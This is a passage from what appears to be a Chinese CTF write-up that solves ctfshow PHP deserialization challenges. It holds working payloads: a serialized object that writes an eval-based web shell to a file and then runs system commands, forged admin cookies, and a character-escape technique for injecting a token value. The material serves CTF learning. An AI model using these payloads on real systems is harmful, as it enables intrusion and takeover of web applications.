class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfshowvip</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username=<span class="hljs-string">&#x27;877.php&#x27;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;password=<span class="hljs-string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span>;<br><br>    &#125;<br><br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ctfshowvip</span>()));<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>payload</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">?vip=O%3A10%3A%22ctfshowvip%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A7%3A%22877.php%22%3Bs%3A8%3A%22password%22%3Bs%3A24%3A%22%3C%3Fphp+<span class="hljs-keyword">eval</span>%28%24_POST%5B1%5D%29%3B%3F%3E%22%3Bs%3A4%3A%22code%22%3Bs%3A0%3A%22%22%3B%7D<br></code></pre></td></tr></table></figure><p>然后进入877.php中，POST 1&#x3D;system(‘cat &#x2F;f*’);</p><h2 id="web262"><a href="#web262" class="headerlink" title="web262"></a>web262</h2><p>本题有两种解法，直接构造类和字符逃逸<br>解法一：<br>注释中有一个.php文件，直接进入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">message</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$from</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$msg</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$to</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$token</span>=<span class="hljs-string">&#x27;user&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$f</span>,<span class="hljs-variable">$m</span>,<span class="hljs-variable">$t</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">from</span> = <span class="hljs-variable">$f</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;msg = <span class="hljs-variable">$m</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;to = <span class="hljs-variable">$t</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;msg&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$msg</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;msg&#x27;</span>]));<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$msg</span>-&gt;token==<span class="hljs-string">&#x27;admin&#x27;</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>最下面的if的意思是在cookie中给msg传入message序列化后进行base64编码的值，token值是可以改变的，把token变为admin</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">message</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$from</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$msg</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$to</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$token</span>=<span class="hljs-string">&#x27;admin&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$f</span>,<span class="hljs-variable">$m</span>,<span class="hljs-variable">$t</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">from</span> = <span class="hljs-variable">$f</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;msg = <span class="hljs-variable">$m</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;to = <span class="hljs-variable">$t</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">message</span>()));<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>payload：</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">Cookie:mag=Tz<span class="hljs-meta">o3</span>OiJtZX<span class="hljs-symbol">NzYWdlIjo0</span>O<span class="hljs-symbol">ntzOjQ6</span>ImZyb<span class="hljs-number">20</span>i<span class="hljs-meta">O047</span>czozOiJtc<span class="hljs-number">2</span>ci<span class="hljs-meta">O047</span>czoyOiJ<span class="hljs-number">0</span>byI<span class="hljs-number">7</span>TjtzOjU<span class="hljs-number">6</span>I<span class="hljs-symbol">nRva2</span>VuIjtzOjU<span class="hljs-number">6</span>ImFkbWluIjt<span class="hljs-number">9</span><br></code></pre></td></tr></table></figure><p>解法二：字符逃逸</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">message</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$from</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$msg</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$to</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$token</span>=<span class="hljs-string">&#x27;user&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$f</span>,<span class="hljs-variable">$m</span>,<span class="hljs-variable">$t</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">from</span> = <span class="hljs-variable">$f</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;msg = <span class="hljs-variable">$m</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;to = <span class="hljs-variable">$t</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$msg</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">message</span>(<span class="hljs-string">&quot;1&quot;</span>,<span class="hljs-string">&quot;2&quot;</span>,<span class="hljs-string">&#x27;fuck&#x27;</span>);<br><span class="hljs-variable">$umsg</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;fuck&#x27;</span>, <span class="hljs-string">&#x27;loveU&#x27;</span>, <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$msg</span>));<br><br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$msg</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$umsg</span>;<br><br></code></pre></td></tr></table></figure><p>对比字符前后序列化字符的长度的值，过滤后$to的长度是4，但里面有5个字符，这时候进行反序列化，实际上也只会截取4个字符，原本U后面的引号前移一位，这时候就会逃逸出一个字符U，很显然短变成长，每次转换多一个字符从fuck变为loveU，就会多逃逸一个字符<code>s:4:&quot;love&quot;U;s:5:&quot;token&quot;;s:4:&quot;user&quot;;&#125;</code></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css">前:<br>s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;to&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;fuck&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;token&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;user&quot;</span>;&#125;<br>后:<br>s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;to&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;loveU&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;token&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;user&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>这时候，如果我们想让token只变成admin的话，我们可以让它逃逸出来，我们先在$to传入<code>fuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</code>,fuck后要跟引号，原理和sql注入一样，用双引号把$to闭合了，最后用}把反序列化给闭合了，反序列化的时候就会忽略后面的字符</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">message</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$from</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$msg</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$to</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$token</span>=<span class="hljs-string">&#x27;user&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$f</span>,<span class="hljs-variable">$m</span>,<span class="hljs-variable">$t</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">from</span> = <span class="hljs-variable">$f</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;msg = <span class="hljs-variable">$m</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;to = <span class="hljs-variable">$t</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$msg</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">message</span>(<span class="hljs-string">&quot;1&quot;</span>,<span class="hljs-string">&quot;2&quot;</span>,<span class="hljs-string">&#x27;fuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>);<br><span class="hljs-variable">$umsg</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;fuck&#x27;</span>, <span class="hljs-string">&#x27;loveU&#x27;</span>, <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$msg</span>));<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$msg</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$umsg</span>;<br><br></code></pre></td></tr></table></figure><p>观察结果,转换前$to的值应该为<code>s:31:&quot;fuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&quot;</code>正好31个字符,转换后会多一个字符,这时候$to的值为<code>s:31:&quot;loveU&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&quot;</code>后面的}逃逸出来了</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css">前:<br>O:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;message&quot;</span>:<span class="hljs-number">4</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;from&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;1&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;msg&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;2&quot;</span>;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;to&quot;</span>;s:<span class="hljs-number">31</span>:<span class="hljs-string">&quot;fuck&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;token&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;&#125;&quot;;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;token&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;user&quot;</span>;&#125;<br>后:<br>O:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;message&quot;</span>:<span class="hljs-number">4</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;from&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;1&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;msg&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;2&quot;</span>;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;to&quot;</span>;s:<span class="hljs-number">31</span>:<span class="hljs-string">&quot;loveU&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;token&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;&#125;&quot;;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;token&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;user&quot;</span>;&#125;<br><br></code></pre></td></tr></table></figure><p>这时候进行反序列化的时候实际接收的值应该为<code>&#123;s:4:&quot;from&quot;;s:1:&quot;1&quot;;s:3:&quot;msg&quot;;s:1:&quot;2&quot;;s:2:&quot;to&quot;;s:31:&quot;loveU&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&quot;&#125;;s:5:&quot;token&quot;;s:4:&quot;user&quot;;&#125;</code>(双引号前移一位)</p><p>“;s:5:”token”;s:5:”admin”;}的长度为27,要让它逃逸出来,要转换27次才行,我们构造一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">message</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$from</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$msg</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$to</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$token</span>=<span class="hljs-string">&#x27;user&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$f</span>,<span class="hljs-variable">$m</span>,<span class="hljs-variable">$t</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">from</span> = <span class="hljs-variable">$f</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;msg = <span class="hljs-variable">$m</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;to = <span class="hljs-variable">$t</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$msg</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">message</span>(<span class="hljs-string">&quot;1&quot;</span>,<span class="hljs-string">&quot;2&quot;</span>,<span class="hljs-string">&#x27;fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>);<br><span class="hljs-variable">$umsg</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;fuck&#x27;</span>, <span class="hljs-string">&#x27;loveU&#x27;</span>, <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$msg</span>));<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$msg</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$umsg</span>));<br></code></pre></td></tr></table></figure><p>转换前<code>s:135:&quot;fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&quot;</code>正好135位<br>转换后<code>s:135:&quot;loveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveU</code>也正好135位,后面的27位字符”;s:5:”token”;s:5:”admin”;}逃逸出来了,第一个字符”会补上去闭合$to</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css">前:<br>O:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;message&quot;</span>:<span class="hljs-number">4</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;from&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;1&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;msg&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;2&quot;</span>;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;to&quot;</span>;s:<span class="hljs-number">135</span>:<span class="hljs-string">&quot;fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;token&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;&#125;&quot;;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;token&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;user&quot;</span>;&#125;<br>后:<br>O:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;message&quot;</span>:<span class="hljs-number">4</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;from&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;1&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;msg&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;2&quot;</span>;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;to&quot;</span>;s:<span class="hljs-number">135</span>:<span class="hljs-string">&quot;loveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveU&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;token&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;&#125;&quot;;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;token&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;user&quot;</span>;&#125;<br><br></code></pre></td></tr></table></figure><p>最后反序列化时接收的值到了<code>&#123;s:4:&quot;from&quot;;s:1:&quot;1&quot;;s:3:&quot;msg&quot;;s:1:&quot;2&quot;;s:2:&quot;to&quot;;s:135:&quot;loveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveU&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</code>已经结束了,用}闭合了,后面拼接的”;s:5:”token”;s:4:”user”;}不是反序列化的格式,所以直接被忽略了,这时候通过反序列化就成功把token的值改成admin了</p><p>在index.php页面传入,带着cookie去访问message.php,拿到flag</p><h2 id="web264"><a href="#web264" class="headerlink" title="web264"></a>web264</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">message</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$from</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$msg</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$to</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$token</span>=<span class="hljs-string">&#x27;user&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$f</span>,<span class="hljs-variable">$m</span>,<span class="hljs-variable">$t</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">from</span> = <span class="hljs-variable">$f</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;msg = <span class="hljs-variable">$m</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;to = <span class="hljs-variable">$t</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$f</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;f&#x27;</span>];<br><span class="hljs-variable">$m</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;m&#x27;</span>];<br><span class="hljs-variable">$t</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;t&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$f</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$m</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$t</span>))&#123;<br>    <span class="hljs-variable">$msg</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">message</span>(<span class="hljs-variable">$f</span>,<span class="hljs-variable">$m</span>,<span class="hljs-variable">$t</span>);<br>    <span class="hljs-variable">$umsg</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;fuck&#x27;</span>, <span class="hljs-string">&#x27;loveU&#x27;</span>, <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$msg</span>));<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;msg&#x27;</span>]=<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$umsg</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Your message has been sent&#x27;</span>;<br>&#125;<br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br></code></pre></td></tr></table></figure><p>message.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">message</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$from</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$msg</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$to</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$token</span>=<span class="hljs-string">&#x27;user&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$f</span>,<span class="hljs-variable">$m</span>,<span class="hljs-variable">$t</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">from</span> = <span class="hljs-variable">$f</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;msg = <span class="hljs-variable">$m</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;to = <span class="hljs-variable">$t</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;msg&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$msg</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;msg&#x27;</span>]));<span class="hljs-comment">//session中取message</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$msg</span>-&gt;token==<span class="hljs-string">&#x27;admin&#x27;</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    